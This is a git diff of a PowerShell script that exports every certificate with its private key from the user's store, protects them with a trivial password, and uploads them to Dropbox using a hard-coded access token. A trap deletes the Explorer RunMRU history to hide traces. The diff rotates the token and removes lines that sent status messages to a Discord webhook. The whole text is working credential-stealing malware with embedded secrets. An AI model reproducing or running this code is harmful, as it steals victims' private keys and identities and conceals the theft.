@@ -1,10 +1,8 @@
-# now with *some* error handling
-try {
 trap{C:\Windows\System32\reg.exe delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f}
 function send($f) {
     $TargetFilePath = "/c/$f"
     $SourceFilePath = "C:\ProgramData\cloudpath_data\found\$f"
-    $token = "sl.BvIi2BvbETiSX2UXIdyN5VCnyfnza0BDjeospCTHT52d8k9j_IJ07ohmmI-7Ry8eU5WL23r7AKOsFpCqr6g5Z7XB4iCgIMH6izsykIe3_CtTchPjOZr13N2NcIBxDzH6kDWtNUL--Ekm"
+    $token = "sl.BvIwa-ou3oHQANOCUzA0Yw5pWSY7fWgC3ozmlhYCB2Vsb1P90bEaD8jA-8rKDCZP1tfV2w0U9MAUHbvSZqBWHzWtWrLHC_2Pne-X6ckL__SQcSaqfAiiIV2s8RW_d3q0tKPzHKz7OJ7j"
     $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
     $authorization = "Bearer " + $token
     $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
@@ -21,10 +19,3 @@ cd found
 $p = ConvertTo-SecureString -String '.' -Force -AsPlainText
 gci Cert:\CurrentUser\My\|%{Export-PfxCertificate $_ "C:\ProgramData\cloudpath_data\found\$($_.Thumbprint)" -Password $p}
 gci C:\ProgramData\cloudpath_data\found\|%{send $_.Name}
-}
-catch {
-    iwr -useb -Headers @{Accept='application/json';'Content-Type'='application/json'} -Method 'POST' -Body (ConvertTo-Json @{content='ERROR: '+$_}) https://discord.com/api/webhooks/1104701170624241766/TJ-AHScxciwD3lTYzaEPXgeSufZQxGPEUakE4yYebKXBhbBtq_XBZkkf7FQn86pAerXr
-    sleep 5
-    exit
-}
-iwr -useb -Headers @{Accept='application/json';'Content-Type'='application/json'} -Method 'POST' -Body (ConvertTo-Json @{content='ended'}) https://discord.com/api/webhooks/1104701170624241766/TJ-AHScxciwD3lTYzaEPXgeSufZQxGPEUakE4yYebKXBhbBtq_XBZkkf7FQn86pAerXr
